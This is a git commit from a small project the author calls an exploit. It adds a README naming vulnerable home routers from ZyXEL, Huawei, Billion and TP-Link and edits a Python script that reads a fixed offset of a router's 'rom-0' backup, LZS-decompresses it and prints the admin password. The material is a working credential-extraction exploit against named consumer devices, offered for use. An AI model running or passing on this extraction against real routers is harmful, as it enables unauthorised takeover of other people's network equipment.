8279cff20e67d21aec3c022911ee3f3f54e9b725
Denis Kadyshev <metajiji@metajiji.tk>
2015-11-20 01:47:24 +0600

    Add README.md

---
+++ README.md
@@ -0,0 +1,16 @@
+# DESCRIPTION
+
+This exploit extact "admin" password from "rom-0".
+
+# Vulnerable routers list
+
+* ZyXEL P-660HW T1 V2
+* Huawei EchoLife HG520s
+* Billion 5200
+* TP Link W8901G
+
+# LINKS
+
+* http://reverseengineering.stackexchange.com/questions/3662/backup-from-zynos-but-can-not-be-decompressed-with-lzs
+* https://github.com/MrNasro/scripts/tree/master/exploits/rom0x
+* http://codepad.org/a6k1D0IT
--- decomp.py
+++ decomp.py
@@ -7,19 +7,12 @@
 
 
 import os
-from struct import unpack
-from lib.lzs import Block, LZSDecompress
+from lib.lzs import LZSDecompress
 
 fname = 'rom-0asdasd'
 # fname = 'rom-0'
 with open(os.path.join('tmp', fname), 'rb') as fd:
-    # get spt.dat
-    # dd if=/tmp/rom-0 of=/tmp/spt.dat bs=1 skip=8552 count=39600
-    # dd if=/tmp/spt.dat of=/tmp/data bs=1 count=220 skip=16
-    fpos = 8568
-    count = 220
-    fd.seek(fpos)
-    chunk = fd.read(count)
-
+    fd.seek(8568)
+    chunk = fd.read(220)
     data = LZSDecompress(chunk)[0]
-    print data[20:].split('\x00')[0]
+    print 'Password: %s'% data[20:].split('\x00')[0]
